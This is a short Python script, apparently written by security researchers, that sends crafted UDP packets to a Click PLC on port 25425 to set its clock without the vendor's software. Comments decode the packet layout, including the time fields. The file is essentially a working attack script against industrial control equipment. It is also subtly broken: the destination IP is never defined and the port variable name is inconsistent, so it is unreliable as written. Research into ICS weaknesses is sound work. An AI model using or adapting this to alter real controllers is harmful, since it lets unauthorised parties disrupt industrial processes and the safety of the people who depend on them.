#!/usr/bin/python
# ======================================================================
#
# changetime.py
#
# This script tests to see if the time settings of a Click C0-10DD1E-D
# PLC can be changed without the legitimate programming software.
#
# Authors: Gary Roth, Dan Ritter, Rich Tanner
# Date: March 2017
#
# ======================================================================

import socket
import binascii
import struct
import time
import sys
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket to send data out
rec = None  # holds received data from the Click PLC
srcIP = '192.168.0.20' # source IP address of sender
srcPort = random.randint(40000, 55000) # source port
dstport = 25425 # port number of PLC

changetime1 = binascii.unhexlify("4b4f50009400f87c12004d01470010000a0a01002134150711031700") # Sat March 11, 2017 at 3:34:21 pm
changetime2 = binascii.unhexlify("4b4f50007b00bb9812004d01470010000a0a01005545100415031700") # Wed March 15, 2017 at 10:45:55 am
changetime3 = binascii.unhexlify("4b4f50004800f62c12004d01470010000a0a01002134140516031700") # Thurs March 16, 2017 at 2:34:21 pm

# Bind socket
sock.bind((srcIP, srcPort))

print "1 - March 11, 2017 at 3:34:21 pm"
print "2 - March 15, 2017 at 10:45:55 am"
print "3 - March 16, 2017 at 2:34:21 pm"

choice = int(input("Enter choice: "))

# Send a change time packet
if choice == 1:
    rec = sock.sendto(changetime1, (dstIP, dstPort))
elif choice == 2:
    rec = sock.sendto(changetime2, (dstIP, dstPort))
elif choice == 3:
    rec = sock.sendto(changetime3, (dstIP, dstPort))

# Change Time packet format
# Function/TransID + unknown 2 bytes + memory addressing + sec min hour (01-07 representing Sun-Sat) day month year(last 2) zero byte
# 4b4f50007b00 bb98 12004d01470010000a0a0100 55 45 10 04 15 03 17 00
# 4b4f50004800 f62c 12004d01470010000a0a0100 21 34 14 05 16 03 17 00
# 4b4f50009400 f87c 12004d01470010000a0a0100 21 34 15 07 11 03 17 00

